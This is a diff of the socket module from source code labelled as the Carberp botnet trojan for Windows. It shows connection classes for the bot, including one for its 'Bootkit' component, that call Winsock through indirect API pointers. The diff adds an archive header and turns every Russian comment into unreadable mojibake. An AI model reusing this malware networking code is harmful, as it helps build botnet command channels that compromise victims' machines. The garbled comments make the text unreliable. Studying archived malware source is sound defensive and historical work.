@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #pragma hdrstop
@@ -30,10 +41,10 @@ TBotSocket::~TBotSocket()
 
 
 //------------------------------------------------------
-//  Connect - Функция сокет и подключается к указанному
-//			  серверу
-//  HostName - Имя сервера
-//  Port     - Порт к которому будем подключаться
+//  Connect - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//			  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  HostName - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  Port     - пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 bool TBotSocket::Connect(const char *HostName, WORD Port)
 {
@@ -41,12 +52,12 @@ bool TBotSocket::Connect(const char *HostName, WORD Port)
 }
 
 //------------------------------------------------------
-//  Connect - Функция сокет и подключается к указанному
-//			  серверу
-//  HostName - Имя сервера
-//  Port     - Порт к которому будем подключаться
-//  Timeout  - Интервал времени в течении которого будет
-//             производиться попытка подключения
+//  Connect - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//			  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  HostName - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  Port     - пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  Timeout  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//             пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 bool TBotSocket::Connect(const char *HostName, WORD Port, DWORD Timeout)
 {
@@ -66,7 +77,7 @@ TBotSocket* CreateSocket()
 
 bool InitWindowsSocketApi()
 {
-	// Инициализируем библиотеку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	WSADATA wsa;
 	ClearStruct(wsa);
 	DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
@@ -79,13 +90,13 @@ TWinSocket::TWinSocket() : Socket(INVALID_SOCKET)
 
 TWinSocket::~TWinSocket()
 {
-	// Закрываем все свои ресурсы в своём деструкторе.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	Close();
 }
 
 void TWinSocket::Close()
 {
-	// Если сокет не был создан - ничего не делаем.
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	if (Socket == INVALID_SOCKET) return;
 
 	pshutdown(Socket, SD_BOTH);
@@ -100,10 +111,10 @@ bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 {
 	if (Timeout == 0) Timeout = 60 * 60;// 1 hour
 	
-	// Если сокет соединён - запрещаем повторное соединение
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Socket != INVALID_SOCKET) return false;
 
-	// Инициализируем библиотеку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!InitWindowsSocketApi()) return false;
 
 	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname(HostName);
@@ -111,7 +122,7 @@ bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 	if (!lpHost)
 		return false;
 
-	// Открываем хост
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );
 
 	if(Socket == SOCKET_ERROR)
@@ -123,7 +134,7 @@ bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
 	SockAddr.sin_port		 = MAKEPORT((unsigned short)Port );
 
-	// подключаемся к сокету
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
 	{
 		pclosesocket( Socket );
@@ -134,25 +145,25 @@ bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 
 /*	do
 	{
-		// Инициализируем библиотеку
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (!InitWindowsSocketApi()) break;
 
-		// Получаем  адрес по имени хоста
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname(HostName);
 
-		// Не нашли имя
+		// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		if ( lpHost == NULL ) break;
 
 		Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
-		// Сокет не создался
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if( Socket == INVALID_SOCKET ) break;
 
-		// Включаем неблокирующий режим
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		u_long nonblocking_enabled = 1;
 		int ioct_result = (int)pioctlsocket(Socket, FIONBIO, &nonblocking_enabled);
 
-		// Не получилось включит неблокирующий режим
+		// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (ioct_result != NO_ERROR) break;
 
 		struct sockaddr_in SockAddr;
@@ -161,14 +172,14 @@ bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 		SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
 		SockAddr.sin_port        = MAKEPORT((unsigned short)Port );
 
-		// подключаемся к хосту
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 		int   connect_result = (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) );
 		DWORD last_error = (DWORD)pWSAGetLastError();
 
-		// Ф-ция обязана завершатся ошибкой в неблокирующем режиме
+		// пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (connect_result != SOCKET_ERROR) break;
 
-		// Ошибка не связана с неблокирующим режимом
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (last_error !=  WSAEWOULDBLOCK) break;
 
 		fd_set writefds;
@@ -190,21 +201,21 @@ bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 
 		int select_result = (int)pselect(0, &readfds, &writefds, &excptfds, &tv);
 
-		// Ошибка при вызове select
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ select
 		if (select_result == SOCKET_ERROR) break;
 
-		// Ошибка при соединении.
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		if (pWSAFDIsSet(Socket, &excptfds) != 0) break;
 
-		// Ошибок не было, но и подключится не успел.
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 		if (pWSAFDIsSet(Socket, &writefds) == 0) break;
 
-		// Тут получается что успел подключится.
-		// Отключаем неблокирующий режим
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		nonblocking_enabled = 0;
 		ioct_result = (int)pioctlsocket(Socket, FIONBIO, &nonblocking_enabled);
 
-		// Не получилось отключить неблокирующий режим
+		// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (ioct_result != NO_ERROR) break;
 
 		return true;
@@ -226,7 +237,7 @@ int TWinSocket::Read(void* Buf, DWORD BufSize)
 }
 
 //***************************************************************
-//  TBkSocket - Класс для работы с сокетом комплекса Bootkit
+//  TBkSocket - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Bootkit
 //
 //***************************************************************
 TBotSocket* CreateBootkitSocket()
@@ -238,7 +249,7 @@ bool TBkSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 {
 	if (Timeout == 0) Timeout = 60 * 60;// 1 hour
 	
-	// Если сокет соединён - запрещаем повторное соединение
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Socket != INVALID_SOCKET) return false;
 
 	Close();
@@ -257,7 +268,7 @@ TBkSocket::~TBkSocket()
 
 void TBkSocket::Close()
 {
-	// Если сокет не был создан - ничего не делаем.
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	if (Socket == INVALID_SOCKET) return;
 
 	Socket = INVALID_SOCKET;
